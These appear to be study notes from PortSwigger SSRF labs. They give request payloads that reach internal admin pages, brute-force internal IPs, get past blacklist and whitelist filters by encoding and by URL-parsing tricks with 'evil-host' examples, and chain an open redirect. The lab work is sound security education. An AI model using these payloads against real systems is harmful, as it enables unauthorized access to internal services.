### Lab: Basic SSRF against the local server
> Note: The administrative interface might listen on a different port number

Let's say there's an endpoint which accepts the following req.body:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
The result of that request is returned to the client. We can change the req.body to:
```
stockApi=http://localhost/admin
```
which may return us an html for the admin page

### Lab: Basic SSRF against another back-end system
There's an endpoint that in the req.body has `stockApi=<some_url>`
Change the stockApi parameter to http://192.168.0.<to_be_brute_forced>:8080/admin

### SSRF with blacklist-based input filter
Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using the following techniques: 
- Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
- Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. 
- Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

#### Lab: SSRF with blacklist-based input filter
Let's say we're trying to SSRF into http://localhost/admin but the input is blacklisted
We can try to avade the blacklist by double url encoding "a" letter from /admin
And the req.body becomes: stockApi=http://127.1/%25%36%31dmin

### SSRF with whitelist-based input filters
Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:  
- You can embed credentials in a URL before the hostname, using the `@` character. For example:
```
https://expected-host:fakepassword@evil-host
```
- You can use the `#` character to indicate a URL fragment. For example:
```
https://evil-host#expected-host
```
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```
https://expected-host.evil-host
```
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- You can use combinations of these techniques together.

### Lab: SSRF with whitelist-based input filter
There's a check stock endpoint with the following req.body:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```
If we change it to:
```
stockApi=http://localhost OR stockApi=http://127.0.0.1
```
We get an err:
```
External stock check host must be `stock.weliketoshop.net`
```
Which indicates that there's a whitelist that contains `stock.weliketoshop.net`

We play around with it and try the following:
```
stockApi=http://random#stock.weliketoshop.net
```
which gives us back the same error:
```
"External stock check host must be stock.weliketoshop.net"
```
which means that it treats random as the url and `stock.weliketoshop.net` as an element on the website

We can try to double-url-encode `#` character and see what we get as a response
```
stockApi=http://localhost%2523stock.weliketoshop.net
```
After double-url encoding it, we get the same err:
```
"External stock check host must be stock.weliketoshop.net"
```
But if we add `@` - we can get a response from `localhost` (which in this case contains a link to `/admin`)
```
stockApi=http://localhost%2523@stock.weliketoshop.net
```

### Open redirection
Let's say the user-submitted URL is strictly validated
But let's also say there are 2 different endpoints:
```
POST /product/stock HTTP/2 
req.body = stockApi=/product/stock/check?productId=1&storeId=1
```
And the second:
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
```

We can try to modify the req.body of the first endpoint to the following:
```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```
And it will include the contents of /admin in the POST /product/stock response
In other words server will return  302 redirection to whatever is specified in `path` param 

## Blind SSRF vulnerabilities
- e.g. check Referer header, you can try to paste a url of your own server and see if it makes requests to it... 

> Note: It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations. 

### Lab: Blind SSRF with out-of-band detection
The lab is very simple. The server extracts value from Referer header and makes a request to the url that is specified in the referrer header.

### Url validation bypass cheat sheet
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

